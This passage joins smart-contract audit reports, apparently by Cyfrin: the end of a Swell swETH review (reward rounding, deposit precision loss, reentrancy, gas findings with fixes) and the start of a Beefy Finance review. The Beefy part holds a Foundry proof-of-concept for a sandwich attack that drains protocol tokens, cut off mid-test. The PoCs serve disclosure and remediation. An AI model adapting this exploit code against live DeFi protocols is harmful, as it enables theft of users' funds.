1) by calling `RepricingOracle::submitSnapshotV2` with small values for `_snapshot.rewardsPayableForFees`, this results in `swETH::reprice` being called with small `_newETHRewards`
2) inside `swETH::reprice` the small `_newETHRewards` triggers a rounding down to zero precision loss in the rewards calculation of `rewardsInSwETH` so [rewards are never distributed](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swETH.sol#L278)
3) however `swETH::reprice` does [update](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swETH.sol#L337) `lastRepriceETHReserves` using the small positive `_newETHRewards` value and the transaction completes successfully.

This results in an invalid state where:

1) `swETH::lastRepriceETHReserves` increases
2) `swETH : ETH` exchange rate increases
3) no rewards are being paid out to operators/treasury

This simplified PoC can be added to `reprice.test.ts`:
```typescript
    it("audit small rewards not distributed while reserves and exchange rate increasing", async () => {
      const swellTreasuryRewardPercentage = parseEther("0.1");

      await swETH_Deployer.setSwellTreasuryRewardPercentage(
        swellTreasuryRewardPercentage
      );

      await swETH_Deployer.deposit({
        value: parseEther("1000"),
      });
      const preRewardETHReserves = parseEther("1100");

      const swETHSupply = parseEther("1000");

      const ethRewards = parseUnits("1", "wei");

      const swellTreasuryPre = await swETH_Deployer.balanceOf(SwellTreasury.address);
      const ethReservesPre = await swETH_Deployer.lastRepriceETHReserves();
      const rateBefore = await swETH_Deployer.swETHToETHRate();

      swETH_Bot.reprice(
          preRewardETHReserves,
          ethRewards,
          swETH_Deployer.totalSupply());

      const swellTreasuryPost = await swETH_Deployer.balanceOf(SwellTreasury.address);
      const ethReservesPost = await swETH_Deployer.lastRepriceETHReserves();
      const rateAfter = await swETH_Deployer.swETHToETHRate();

      // no rewards distributed to treasury
      expect(swellTreasuryPre).eq(swellTreasuryPost);

      // exchange rate increases
      expect(rateBefore).lt(rateAfter);

      // reserves increase
      expect(ethReservesPre).lt(ethReservesPost);

      // repricing using small `_newETHRewards` can lead to increasing reserves
      // and increasing exchange rate without reward payouts
    });
```

This was not introduced in the new changes but is present in the current mainnet code [[1](https://github.com/SwellNetwork/v3-core-public/blob/master/contracts/lst/contracts/implementations/swETH.sol#L264), [2](https://github.com/SwellNetwork/v3-core-public/blob/master/contracts/lst/contracts/implementations/swETH.sol#L323-L325)].

**Swell:** Acknowledged.


### Precision loss in `swETH::_deposit` from unnecessary hidden division before multiplication

**Description:** `swETH::_deposit` [L170](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swETH.sol#L170) contains a hidden unnecessary [division before multiplication](https://dacian.me/precision-loss-errors#heading-division-before-multiplication) as the call to `_ethToSwETHRate` performs a division which then gets multiplied by `msg.value`:
```solidity
uint256 swETHAmount = wrap(msg.value).mul(_ethToSwETHRate()).unwrap();
// @audit expanding this out
// wrap(msg.value).mul(_ethToSwETHRate()).unwrap();
// wrap(msg.value).mul(wrap(1 ether).div(_swETHToETHRate())).unwrap();
```

This issue has not been introduced in the new changes but is in the mainnet [code](https://github.com/SwellNetwork/v3-core-public/blob/master/contracts/lst/contracts/implementations/swETH.sol#L170).

**Impact:** Slightly less `swETH` will be minted to depositors. While the amount by which individual depositors are short-changed is individually small, the effect is cumulative and increases as depositors and deposit size increase.

**Proof of Concept:** This stand-alone stateless fuzz test can be run inside Foundry to prove this as well as provided hard-coded test cases:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import {UD60x18, wrap} from "@prb/math/src/UD60x18.sol";

import "forge-std/Test.sol";

// run from base project directory with:
// (fuzz test) forge test --match-test FuzzMint -vvv
// (hardcoded) forge test --match-test HardcodedMint -vvv
contract MintTest is Test {

    uint256 private constant SWETH_ETH_RATE = 1050754209601187151; //as of 2024-02-15

    function _mintOriginal(uint256 inputAmount) private pure returns(uint256) {
        // hidden division before multiplication
        // wrap(inputAmount).mul(_ethToSwETHRate()).unwrap();
        // wrap(inputAmount).mul(wrap(1 ether).div(_swETHToETHRate())).unwrap()

        return wrap(inputAmount).mul(wrap(1 ether).div(wrap(SWETH_ETH_RATE))).unwrap();
    }

    function _mintFixed(uint256 inputAmount) private pure returns(uint256) {
        // refactor to perform multiplication before division
        // wrap(inputAmount).mul(wrap(1 ether)).div(_swETHToETHRate()).unwrap();

        return wrap(inputAmount).mul(wrap(1 ether)).div(wrap(SWETH_ETH_RATE)).unwrap();
    }

    function test_FuzzMint(uint256 inputAmount) public pure {
        uint256 resultOriginal = _mintOriginal(inputAmount);
        uint256 resultFixed    = _mintFixed(inputAmount);

        assert(resultOriginal == resultFixed);
    }

    function test_HardcodedMint() public {
        // found by fuzzer
        console.log(_mintFixed(3656923177187149889) - _mintOriginal(3656923177187149889)); // 1

        // 100 eth
        console.log(_mintFixed(100 ether) - _mintOriginal(100 ether)); // 21

        // 1000 eth
        console.log(_mintFixed(1000 ether) - _mintOriginal(1000 ether)); // 215

        // 10000 eth
        console.log(_mintFixed(10000 ether) - _mintOriginal(10000 ether)); // 2159
    }
}
```

**Recommended Mitigation:** Refactor to perform multiplication before division:
```solidity
uint256 swETHAmount = wrap(msg.value).mul(wrap(1 ether)).div(_swETHToETHRate()).unwrap();
```

**Swell:** Fixed in commit [cb093ea](https://github.com/SwellNetwork/v3-contracts-lst/commit/cb093eac675e5248a3f736a01a3725d794dd177e).

**Cyfrin:**
Verified.

\clearpage
## Informational


### Emit `ETHSent` event when sending eth

**Description:** `DepositManager::receive` emits an `ETHReceived` event when receiving eth, but `transferETHForWithdrawRequests` does not emit any events when sending eth; consider also emitting an `ETHSent` event when sending eth.

**Swell:** Fixed in commit [c82dd3c](https://github.com/SwellNetwork/v3-contracts-lst/commit/c82dd3c8ca6853816dd9f1982ab0a5ef50d78cf2).

**Cyfrin:**
Verified.


### Use Checks-Effects-Interactions pattern in `swEXIT::createWithdrawRequest`

**Description:** The current implementation uses [`_safeMint`](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swEXIT.sol#L209) before modifying state variables:
* `withdrawalRequests[tokenId] `
* `exitingETH`
* `_lastTokenIdCreated`

This allows possible re-entrancy where the receiver and access the non-updated state variables. While during the audit no meaningful permissionless attack vectors related to this issue were found, to follow best security practices it is advisable to move `_safeMint` to the end of the function:

```diff
  function createWithdrawRequest(
    uint256 amount
  ) external override checkWhitelist(msg.sender) {
    if (AccessControlManager.withdrawalsPaused()) {
      revert WithdrawalsPaused();
    }

    if (amount < withdrawRequestMinimum) {
      revert WithdrawRequestTooSmall(amount, withdrawRequestMinimum);
    }

    if (amount > withdrawRequestMaximum) {
      revert WithdrawRequestTooLarge(amount, withdrawRequestMaximum);
    }

    IswETH swETH = AccessControlManager.swETH();
    swETH.transferFrom(msg.sender, address(this), amount);

    // Burn the tokens first to prevent reentrancy and to validate they own the requested amount of swETH
    swETH.burn(amount);

-   uint256 tokenId = _lastTokenIdCreated + 1; // Start off at 1
+   uint256 tokenId = ++_lastTokenIdCreated; // Starts off at 1

-   _safeMint(msg.sender, tokenId);

    uint256 lastTokenIdProcessed = getLastTokenIdProcessed();

    uint256 rateWhenCreated = AccessControlManager.swETH().swETHToETHRate();

    withdrawalRequests[tokenId] = WithdrawRequest({
      amount: amount,
      timestamp: block.timestamp,
      lastTokenIdProcessed: lastTokenIdProcessed,
      rateWhenCreated: rateWhenCreated
    });

    exitingETH += wrap(amount).mul(wrap(rateWhenCreated)).unwrap();
-   _lastTokenIdCreated = tokenId;
+   _safeMint(msg.sender, tokenId);

    emit WithdrawRequestCreated(
      tokenId,
      amount,
      block.timestamp,
      lastTokenIdProcessed,
      rateWhenCreated,
      msg.sender
    );

  }
```

**Swell:** Fixed in commits [d13aa43](https://github.com/SwellNetwork/v3-contracts-lst/commit/d13aa4390bb75c4e491b9cd92b7f7561cbe4ec15), [3f85df3](https://github.com/SwellNetwork/v3-contracts-lst/commit/3f85df3ba0e91b26e4234b15ad94f492fa6d46ec).

**Cyfrin:**
Verified.


### Missing events in `NodeOperatorRegistry` update methods

**Description:** The following functions in `NodeOperatorRegistry` update multiple storage locations but don't emit any events:
* `updateOperatorControllingAddress`
* `updateOperatorRewardAddress`
* `updateOperatorName`

Consider emitting events in these functions to reflect the updates made to storage.

**Swell:** Fixed in commit [5849640](https://github.com/SwellNetwork/v3-contracts-lst/commit/584964072b1543128c02e3287fe7746a8a094226).

**Cyfrin:**
Verified.


### Refactor identical code in `NodeOperatorRegistry::getNextValidatorDetails`

**Description:** The bodies of these two `else if` [branches](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/NodeOperatorRegistry.sol#L151-L162) are identical:

```solidity
} else if (foundOperatorId == 0) {
  // If no operator has been found yet set the smallest operator active keys to the current operator
  smallestOperatorActiveKeys = operatorActiveKeys;

  foundOperatorId = operatorId;

  // If the current operator has less keys than the smallest operator active keys, then we want to use this operator
} else if (smallestOperatorActiveKeys > operatorActiveKeys) {
  smallestOperatorActiveKeys = operatorActiveKeys;

  foundOperatorId = operatorId;
}
```

Hence the code can be simplified to:
```solidity
// If no operator has been found yet set the smallest operator active keys to the current operator
// If the current operator has less keys than the smallest operator active keys, then we want to use this operator
} else if (foundOperatorId == 0 ||
           smallestOperatorActiveKeys > operatorActiveKeys) {
  smallestOperatorActiveKeys = operatorActiveKeys;
  foundOperatorId = operatorId;
}
```

**Swell:** Fixed in commit [d457d8d](https://github.com/SwellNetwork/v3-contracts-lst/commit/d457d8d109770f86b2b6ab3f785e1678ca341d6f).

**Cyfrin:**
Verified.

\clearpage
## Gas Optimization


### Cache storage variables in memory when read multiple times without being changed

**Description:** As reading from storage is considerably more expensive than reading from memory, cache storage variables in memory when read multiple times without being changed:

File: `NodeOperatorRegistry.sol`
```solidity
// @audit cache `numOperators` in memory from storage
// to prevent reading same value multiple times
113:    uint128[] memory operatorAssignedDetails = new uint128[](numOperators + 1);
125:     for (uint128 operatorId = 1; operatorId <= numOperators; operatorId++) {

// @audit save incremented value in memory
// to prevent reading same value multiple times, eg:
// uint128 newNumOperators = ++numOperators;
305:    numOperators += 1;
// then use `newNumOperators` in L314,315
314:    getOperatorIdForAddress[_operatorAddress] = numOperators;
315:    getOperatorForOperatorId[numOperators] = operator;
// @audit `Operator` struct can also be initialized this way:
// getOperatorForOperatorId[numOperators] = Operator(true, _rewardAddress, _operatorAddress, _name, 0);

// @audit cache `getOperatorForOperatorId[operatorId].activeValidators`
660:    if (getOperatorForOperatorId[operatorId].activeValidators == 0) {
666:      getOperatorForOperatorId[operatorId].activeValidators - 1
```

File: `RepricingOracle.sol`
```solidity
// @audit cache rate when checked after repricing and use
// cached version when processing withdrawals since the rate
// only changes during repricing which has already occurred
125:    if (swETHToETHRate > AccessControlManager.swETH().swETHToETHRate()) {
132:        AccessControlManager.swETH().swETHToETHRate() // The rate to use for processing withdrawals

// @audit cache `upgradeableRepriceSnapshot.meta.blockNumber` in memory from storage
// to prevent reading same value multiple times
290:    bool useOldSnapshot = upgradeableRepriceSnapshot.meta.blockNumber == 0;
294:      : upgradeableRepriceSnapshot.meta.blockNumber;

// @audit cache `maximumRepriceBlockAtSnapshotStaleness` in memory from storage
// to prevent reading same value multiple times
317:    if (snapshotStalenessInBlocks > maximumRepriceBlockAtSnapshotStaleness) {
320:        maximumRepriceBlockAtSnapshotStaleness
```

File: `swETH.sol`
```solidity
// @audit cache `lastRepriceUNIX` in memory from storage
// to prevent reading same value multiple times
222:    uint256 timeSinceLastReprice = block.timestamp - lastRepriceUNIX;
249:    if (lastRepriceUNIX != 0) {

// @audit cache `minimumRepriceTime` in memory from storage
// to prevent reading same value multiple times
224:    if (timeSinceLastReprice < minimumRepriceTime) {
226:        minimumRepriceTime - timeSinceLastReprice

// @audit cache `nodeOperatorRewardPercentage` in memory from storage
// to prevent reading same value multiple times
233:      nodeOperatorRewardPercentage;
281:      UD60x18 nodeOperatorRewardPortion = wrap(nodeOperatorRewardPercentage)

// @audit cache `swETHToETHRateFixed` in memory from storage
// to prevent reading same value multiple times
253:        swETHToETHRateFixed
256:      uint256 maximumRepriceDiff = wrap(swETHToETHRateFixed)

// @audit no need to re-read storage values, use the in-memory variables
// that storage locations were just updated from to eliminate redundant but
// expensive storage reads
337:    lastRepriceETHReserves = totalReserves;
338:    lastRepriceUNIX = block.timestamp;
339:    swETHToETHRateFixed = updatedSwETHToETHRateFixed;

341:   emit Reprice(
342:      lastRepriceETHReserves, // @audit use `totalReserves` instead
343:       swETHToETHRateFixed,   // @audit use `updatedSwETHToETHRateFixed` instead
344:       nodeOperatorRewards,
345:       swellTreasuryRewards,
346:       totalETHDeposited

// @audit the first check will fail most of the time during regular usage so
// `swETHToETHRateFixed` will be read twice from storage with the same value
374:    if (swETHToETHRateFixed == 0) {
375:    return wrap(swETHToETHRateFixed);
```

File: `swEXIT.sol`
```solidity
// @audit consider caching `withdrawRequestMinimum` and `withdrawRequestMaximum`
// in memory to avoid an extra storage read in the revert case
193:    if (amount < withdrawRequestMinimum) {
194:       revert WithdrawRequestTooSmall(amount, withdrawRequestMinimum);
195:     }

197:     if (amount > withdrawRequestMaximum) {
198:      revert WithdrawRequestTooLarge(amount, withdrawRequestMaximum);
199:     }
```

**Swell:** Fixed in commits [23be897](https://github.com/SwellNetwork/v3-contracts-lst/commit/23be89740b7659ab4d98435d6a924364635fb9ca), [3f85df3](https://github.com/SwellNetwork/v3-contracts-lst/commit/3f85df3ba0e91b26e4234b15ad94f492fa6d46ec).

**Cyfrin:**
Verified.


### Cache array length outside of loops and consider unchecked loop incrementing

**Description:** Cache array length outside of loops and consider using `unchecked {++i;}` if not compiling with `solc --ir-optimized --optimize`:

File: `DepositManager.sol`
```solidity
// @audit cache `validatorDetails.length`
116:    for (uint256 i; i < validatorDetails.length; i++) {
```

File: `NodeOperatorRegistry.sol`
```solidity
// @audit cache `numOperators`
133:    uint128[] memory operatorAssignedDetails = new uint128[](numOperators + 1);
125:      for (uint128 operatorId = 1; operatorId <= numOperators; operatorId++) {

// @audit cache `_pubKeys.length`
189:    validatorDetails = new ValidatorDetails[](_pubKeys.length);
191:    for (uint256 i; i < _pubKeys.length; i++) {
227:    numPendingValidators -= _pubKeys.length;

// @audit cache `_validatorDetails.length`
243:    if (_validatorDetails.length == 0) {
257:        _validatorDetails.length >
263:    for (uint128 i; i < _validatorDetails.length; i++) {
282:    numPendingValidators += _validatorDetails.length;

// @audit cache `_pubKeys.length`
396:    for (uint128 i; i < _pubKeys.length; i++) {
412:     numPendingValidators -= _pubKeys.length;

// @audit cache `_pubKeys.length`
425:     for (uint256 i; i < _pubKeys.length; i++) {

// @audit cache `operatorIdToValidatorDetails[operatorId].length()`
628:     if (operatorIdToValidatorDetails[operatorId].length() == 0) {
634:      operatorIdToValidatorDetails[operatorId].length() - 1
```

File: `swEXIT.sol`
```solidity
// @audit cache `requestsToProcess + 1`
143:    for (uint256 i = 1; i < requestsToProcess + 1; ) {
```

File: `Whitelist.sol`
```solidity
// @audit cache `_addresses.length`
 84:    for (uint256 i; i < _addresses.length; ) {
102:    for (uint256 i; i < _addresses.length; ) {
```

**Swell:** Fixed in commits [3c67e88](https://github.com/SwellNetwork/v3-contracts-lst/commit/3c67e88dbea1bb4cdf0bfeda27b40e71e494ef2c), [3f85df3](https://github.com/SwellNetwork/v3-contracts-lst/commit/3f85df3ba0e91b26e4234b15ad94f492fa6d46ec).

**Cyfrin:**
Verified.


### `NodeOperatorRegistry::_parsePubKeyToString`: Use shift operations rather than division/multiplication when dividend/factor is a power of 2

**Description:** While `DIV` and `MUL` opcodes cost 5 gas unit each, shift operations cost 3 gas units. Therefore, `NodeOperatorRegistry::_parsePubKeyToString` can take advantage of them to save gas:

```diff
+   uint256 private SYMBOL_LENGTH = 16 // Because _SYMBOLS.length = 16
    function _parsePubKeyToString(
        bytes memory pubKey
    ) internal pure returns (string memory) {
        // Create the bytes that will hold the converted string
-      bytes memory buffer = new bytes(pubKey.length * 2);
+       // make sure that pubKey.length * 2 <= 2^256
+      bytes memory buffer = new bytes(pubKey.length << 1);

        bytes16 symbols = _SYMBOLS;
+       uint256 symbolLength = symbols.length;
+       uint256 index;
        for (uint256 i; i < pubKey.length; i++) {
-           buffer[i * 2] = symbols[uint8(pubKey[i]) / symbols.length];
-           buffer[i * 2 + 1] = symbols[uint8(pubKey[i]) % symbols.length];
+           index = i << 1; // i * 2
+           buffer[index] = symbols[uint8(pubKey[i]) >> 4]; // SYMBOL_LENGTH = 2^4
+           buffer[index + 1] = symbols[uint8(pubKey[i]) % SYMBOL_LENGTH];
        }

        return string(abi.encodePacked("0x", buffer));
    }
```

A more optimized version of this function looks like:
```solidity
bytes16 private constant _SYMBOLS = "0123456789abcdef";
uint256 private constant SYMBOL_LENGTH = 16; // Because _SYMBOLS.length = 16

function _parsePubKeyToString(bytes memory pubKey) internal pure returns (string memory) {
    // Create the bytes that will hold the converted string
    // make sure that pubKey.length * 2 <= 2^256
    uint256 pubKeyLength  = pubKey.length;
    bytes memory buffer   = new bytes(pubKeyLength << 1);

    uint256 index;
    for (uint256 i; i < pubKeyLength;) {
        index             = i << 1; // i * 2
        buffer[index]     = _SYMBOLS[uint8(pubKey[i]) >> 4]; // SYMBOL_LENGTH = 2^4
        buffer[index + 1] = _SYMBOLS[uint8(pubKey[i]) % SYMBOL_LENGTH];

        unchecked {++i;}
    }

    return string(abi.encodePacked("0x", buffer));
}
```

The following stand-alone test using Foundry & [Halmos](https://github.com/a16z/halmos/) verifies that the optimized version returns the same output as the original:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";

// run from base project directory with:
// halmos --function test --match-contract ParseTest
contract ParseTest is Test {

    bytes16 private constant _SYMBOLS = "0123456789abcdef";
    uint256 private constant SYMBOL_LENGTH = 16; // Because _SYMBOLS.length = 16

    function _parseOriginal(bytes memory pubKey) internal pure returns (string memory) {
        // Create the bytes that will hold the converted string
        bytes memory buffer = new bytes(pubKey.length * 2);

        bytes16 symbols = _SYMBOLS;

        // This conversion relies on taking the uint8 value of each byte, the first character in the byte is the uint8 value divided by 16 and the second character is modulo of the 16 division
        for (uint256 i; i < pubKey.length; i++) {
            buffer[i * 2] = symbols[uint8(pubKey[i]) / symbols.length];
            buffer[i * 2 + 1] = symbols[uint8(pubKey[i]) % symbols.length];
        }

        return string(abi.encodePacked("0x", buffer));
    }

    function _parseOptimized(bytes memory pubKey) internal pure returns (string memory) {
        // Create the bytes that will hold the converted string
        // make sure that pubKey.length * 2 <= 2^256
        uint256 pubKeyLength  = pubKey.length;
        bytes memory buffer   = new bytes(pubKeyLength << 1);

        uint256 index;
        for (uint256 i; i < pubKeyLength;) {
            index             = i << 1; // i * 2
            buffer[index]     = _SYMBOLS[uint8(pubKey[i]) >> 4]; // SYMBOL_LENGTH = 2^4
            buffer[index + 1] = _SYMBOLS[uint8(pubKey[i]) % SYMBOL_LENGTH];

            unchecked {++i;}
        }

        return string(abi.encodePacked("0x", buffer));
    }

    function test_HalmosParse(bytes memory pubKey) public {
        string memory resultOriginal  = _parseOriginal(pubKey);
        string memory resultOptimized = _parseOptimized(pubKey);

        assertEq(resultOriginal, resultOptimized);

    }
}
```

**Swell:** Fixed in commits [7db1874](https://github.com/SwellNetwork/v3-contracts-lst/commit/7db187409c7161d981b32d639e8b925fafc431a8), [3f85df3](https://github.com/SwellNetwork/v3-contracts-lst/commit/3f85df3ba0e91b26e4234b15ad94f492fa6d46ec).

**Cyfrin:**
Verified.


### Use `totalReserves - rewardsInETH.unwrap()` rather than `_preRewardETHReserves - rewardsInETH.unwrap() + _newETHRewards` in `swETH::reprice`

**Description:** Both result in the same output but the first expression saves a `SUB` opcode. In addition the suggested modification results in simpler code which better reflects the intention of the invariant.

```diff
    // swETH::reprice
    uint256 totalReserves = _preRewardETHReserves + _newETHRewards;

    uint256 rewardPercentageTotal = swellTreasuryRewardPercentage +
      nodeOperatorRewardPercentage;

    UD60x18 rewardsInETH = wrap(_newETHRewards).mul(
      wrap(rewardPercentageTotal)
    );

    UD60x18 rewardsInSwETH = wrap(_swETHTotalSupply).mul(rewardsInETH).div(
-       wrap(_preRewardETHReserves - rewardsInETH.unwrap() + _newETHRewards)
+       wrap(totalReserves - rewardsInETH.unwrap())
    );
```

**Swell:** Fixed in commit [7db1874](https://github.com/SwellNetwork/v3-contracts-lst/commit/7db187409c7161d981b32d639e8b925fafc431a8).

**Cyfrin:**
Verified.


### Remove redundant pause checks

**Description:** 1) Remove redundant `botMethodsPaused` [check](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swETH.sol#L208-L210) in `swETH::reprice` as:

* this function is only called by [`RepricingOracle::handleReprice`](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/RepricingOracle.sol#L233)
* `RepricingOracle::handleReprice` can only be called by [`submitSnapshot`](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/RepricingOracle.sol#L89-L94) and [`submitSnapshotV2`](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/RepricingOracle.sol#L105-L112) which both already contain the `botMethodsPaused` check.

2) Remove redundant `withdrawalsPaused` [check](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/swEXIT.sol#L117-L119) in `swEXIT::processWithdrawals` as this function is only supposed to be callable by `RepricingOracle` which already [contains](https://github.com/SwellNetwork/v3-contracts-lst/blob/a95ea7942ba895ae84845ab7fec1163d667bee38/contracts/implementations/RepricingOracle.sol#L129) the check.

**Swell:** Fixed in commits [1fca965](https://github.com/SwellNetwork/v3-contracts-lst/commit/1fca965019facc4dcc79c35bfc45c8a711043196), [3f85df3](https://github.com/SwellNetwork/v3-contracts-lst/commit/3f85df3ba0e91b26e4234b15ad94f492fa6d46ec).

**Cyfrin:**
Verified.


### Refactor `RepricingOracle::handleReprice`, `_assertRepricingSnapshotValidity` and `_repricingPeriodDeltas`

**Description:** In `RepricingOracle::_assertRepricingSnapshotValidity` and `_repricingPeriodDeltas` there is a lot of logic around whether to use the old snapshot or not, based around if `upgradeableRepriceSnapshot.meta.blockNumber == 0`.

If the idea is that the first time repricing occurs after the upgrade the execution path is `useOldSnapshot = true` but after that every time it will be `useOldSnapshot = false`, then it may make more sense to create functions just for that first execution which will only run once, then have functions for all the normal cases which come afterwards. This would avoid the extra gas costs and also simplify the code for all the future normal cases after the first-time-call special case.

Gas costs can also be reduced by having `handleReprice` load the snapshot struct, cache `upgradeableRepriceSnapshot.meta.blockNumber`, calculate `useOldSnapshot` once then pass these in as inputs to `_assertRepricingSnapshotValidity` and `_repricingPeriodDeltas` eg:

```solidity

  function handleReprice(
    UpgradeableRepriceSnapshot calldata _snapshot
  ) internal {
    // only call getSnapshotStruct() once
    UpgradeableRepriceSnapshot
      storage upgradeableRepriceSnapshot = getSnapshotStruct();

    // only calculate these once and pass them as required
    uint256 ursMetaBlockNumber = upgradeableRepriceSnapshot.meta.blockNumber;
    bool useOldSnapshot = ursMetaBlockNumber == 0;

    // validation
    _assertRepricingSnapshotValidity(_snapshot, ursMetaBlockNumber, useOldSnapshot);

    _repricingPeriodDeltas(
          reserveAssets,
          _snapshot.state,
          _snapshot.withdrawState,
          upgradeableRepriceSnapshot,
          useOldSnapshot
        );

    // delete the call to getSnapshotStruct() near the end of handleReprice()
```


**Swell:** Acknowledged. Will be addressed in a future upgrade when the old snapshot is no longer relevant. Swell will continue to pay the excess gas costs in the meantime.


### Use constant for unchanging deposit amount

**Description:** In `DepositManager::setupValidators` there is no use in paying gas to declare then later read this variable which never changes:
```solidity
uint256 depositAmount = 32 ether;
```

Rather simply define a constant:
```solidity
uint256 private constant DEPOSIT_AMOUNT = 32 ether;
```
And use that constant instead.

**Swell:** Acknowledged.

\clearpage

------ FILE END car/reports_md/2024-02-23-cyfrin-swell-barracuda.md ------


------ FILE START car/reports_md/2024-04-06-cyfrin-beefy-finance.md ------

**Lead Auditors**

[Dacian](https://twitter.com/DevDacian)

[carlitox477](https://twitter.com/carlitox477)

**Assisting Auditors**



---

# Findings
## Critical Risk


### Attacker can drain protocol tokens by sandwich attacking owner call to `setPositionWidth` and `unpause` to force redeployment of Beefy's liquidity into an unfavorable range

**Description:** When the owner of the `StrategyPassiveManagerUniswap` contract calls `setPositionWidth` and `unpause` an attacker can sandwich attack these calls to drain the protocol's tokens. This is possible because `setPositionWidth` and `unpause` redeploy Beefy's liquidity into a new range based off the current tick and don't check the `onlyCalmPeriods` modifier, so an attacker can use this to force Beefy to re-deploy liquidity into an unfavorable range.

**Impact:** Attacker can sandwich attack owner call to `setPositionWidth` and `unpause` to drain protocol tokens.

**Proof of Concept:** Add a new test file `test/forge/ConcLiqTests/ConcLiqWBTCUSDC.t.sol:`
```solidity
pragma solidity 0.8.23;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin-4/contracts/token/ERC20/ERC20.sol";
import {BeefyVaultConcLiq} from "contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol";
import {BeefyVaultConcLiqFactory} from "contracts/protocol/concliq/vault/BeefyVaultConcLiqFactory.sol";
import {StrategyPassiveManagerUniswap} from "contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol";
import {StrategyFactory} from "contracts/protocol/concliq/uniswap/StrategyFactory.sol";
import {StratFeeManagerInitializable} from "contracts/protocol/beefy/StratFeeManagerInitializable.sol";
import {IStrategyConcLiq} from "contracts/interfaces/beefy/IStrategyConcLiq.sol";
import {IUniswapRouterV3} from "contracts/interfaces/exchanges/IUniswapRouterV3.sol";

// Test WBTC/USDC Uniswap Strategy
contract ConLiqWBTCUSDCTest is Test {
    BeefyVaultConcLiq vault;
    BeefyVaultConcLiqFactory vaultFactory;
    StrategyPassiveManagerUniswap strategy;
    StrategyPassiveManagerUniswap implementation;
    StrategyFactory factory;
    address constant pool = 0x9a772018FbD77fcD2d25657e5C547BAfF3Fd7D16;
    address constant token0 = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant token1 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant native = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant strategist = 0xb2e4A61D99cA58fB8aaC58Bb2F8A59d63f552fC0;
    address constant beefyFeeRecipient = 0x65f2145693bE3E75B8cfB2E318A3a74D057e6c7B;
    address constant beefyFeeConfig = 0x3d38BA27974410679afF73abD096D7Ba58870EAd;
    address constant unirouter = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address constant keeper = 0x4fED5491693007f0CD49f4614FFC38Ab6A04B619;
    int24 constant width = 500;
    address constant user     = 0x161D61e30284A33Ab1ed227beDcac6014877B3DE;
    address constant attacker = address(0x1337);
    bytes tradePath1;
    bytes tradePath2;
    bytes path0;
    bytes path1;

    function setUp() public {
        BeefyVaultConcLiq vaultImplementation = new BeefyVaultConcLiq();
        vaultFactory = new BeefyVaultConcLiqFactory(address(vaultImplementation));
        vault = vaultFactory.cloneVault();
        implementation = new StrategyPassiveManagerUniswap();
        factory = new StrategyFactory(keeper);

        address[] memory lpToken0ToNative = new address[](2);
        lpToken0ToNative[0] = token0;
        lpToken0ToNative[1] = native;

        address[] memory lpToken1ToNative = new address[](2);
        lpToken1ToNative[0] = token1;
        lpToken1ToNative[1] = native;

        uint24[] memory fees = new uint24[](1);
        fees[0] = 500;

        path0 = routeToPath(lpToken0ToNative, fees);
        path1 = routeToPath(lpToken1ToNative, fees);

        address[] memory tradeRoute1 = new address[](2);
        tradeRoute1[0] = token0;
        tradeRoute1[1] = token1;

        address[] memory tradeRoute2 = new address[](2);
        tradeRoute2[0] = token1;
        tradeRoute2[1] = token0;

        tradePath1 = routeToPath(tradeRoute1, fees);
        tradePath2 = routeToPath(tradeRoute2, fees);

        StratFeeManagerInitializable.CommonAddresses memory commonAddresses = StratFeeManagerInitializable.CommonAddresses(
            address(vault),
            unirouter,
            keeper,
            strategist,
            beefyFeeRecipient,
            beefyFeeConfig
        );

        factory.addStrategy("StrategyPassiveManagerUniswap_v1", address(implementation));

        address _strategy = factory.createStrategy("StrategyPassiveManagerUniswap_v1");
        strategy = StrategyPassiveManagerUniswap(_strategy);
        strategy.initialize(
            pool,
            native,
            width,
            path0,
            path1,
            commonAddresses
        );

        vault.initialize(address(strategy), "Moo Vault", "mooVault");
    }

    // run with:
    // forge test --match-path test/forge/ConcLiqTests/ConcLiqWBTCUSDC.t.sol --fork-url https://rpc.ankr.com/eth --fork-block-number 19410822 -vvv
    function test_AttackerDrainsProtocolViaSetPositionWidth() public {
        // user deposits and beefy sets up its LP position
        uint256 BEEFY_INIT_WBTC = 10e8;
        uint256 BEEFY_INIT_USDC = 600000e6;
        deposit(user, true, BEEFY_INIT_WBTC, BEEFY_INIT_USDC);

        (uint256 beefyBeforeWBTCBal, uint256 beefyBeforeUSDCBal) = strategy.balances();

        // record beefy WBTC & USDC amounts before attack
        console.log("%s : %d", "LP WBTC Before Attack", beefyBeforeWBTCBal); // 999999998
        console.log("%s : %d", "LP USDC Before Attack", beefyBeforeUSDCBal); // 599999999999
        console.log();

        // attacker front-runs owner call to `setPositionWidth` using
        // a large amount of USDC to buy all the WBTC. This:
        // 1) results in Beefy LP having 0 WBTC and lots of USDC
        // 2) massively pushes up the price of WBTC
        //
        // Attacker has forced Beefy to sell WBTC "low"
